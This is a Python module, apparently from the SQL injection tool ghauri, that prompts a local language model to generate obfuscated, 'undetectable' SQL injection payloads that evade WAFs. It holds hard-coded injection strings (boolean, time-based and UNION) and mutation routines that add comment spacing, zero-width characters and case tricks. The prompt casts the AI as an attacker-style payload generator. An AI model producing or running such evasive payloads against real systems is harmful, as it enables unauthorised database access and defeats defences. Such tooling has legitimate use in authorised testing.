# ghauri/core/ai.py - AI Payload Engine (Ollama-Powered)
import ollama
import random
import time

class AIPayloadEngine:
    def __init__(self, model="llama3:8b"):
        self.model = model
        self.fallbacks = [
            "' OR '1'='1'--",
            "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' UNION SELECT NULL--"
        ]

    def generate(self, dbms="Unknown", technique="boolean", context="GET parameter", waf="Unknown"):
        prompt = f"""
You are an elite bug bounty hunter specializing in SQL injection.
Generate ONE novel, obfuscated {technique} payload for {dbms} DBMS.
Injection point: {context}
Bypass WAF: {waf}
Use creative evasion: Unicode, nested comments, CHAR(), random case, whitespace tricks.
Make it 100% unique and undetectable.
Output ONLY the payload, no quotes, no explanation.
"""
        try:
            response = ollama.generate(
                model=self.model,
                prompt=prompt.strip(),
                options={"temperature": 0.85, "num_predict": 80}
            )
            payload = response['response'].strip()
            if payload and len(payload) > 8 and any(c in payload for c in "'\"();"):
                return payload
        except Exception as e:
            print(f"[!] Ollama failed: {e} → using fallback")
            time.sleep(1)

        # Fallback with mutation
        base = random.choice(self.fallbacks)
        return self.mutate_fallback(base)

    def mutate_fallback(self, payload):
        mutations = [
            lambda p: p.replace(" ", "/**/",),
            lambda p: p.replace("'", '"'),
            lambda p: "".join(c + "\u200B" if random.random() > 0.7 else c for c in p),
            lambda p: p.upper().replace("OR", "oR").replace("AND", "aNd"),
            lambda p: f"({p})-- -"
        ]
        for _ in range(3):
            payload = random.choice(mutations)(payload)
        return payload

# Global instance
ai_engine = AIPayloadEngine()
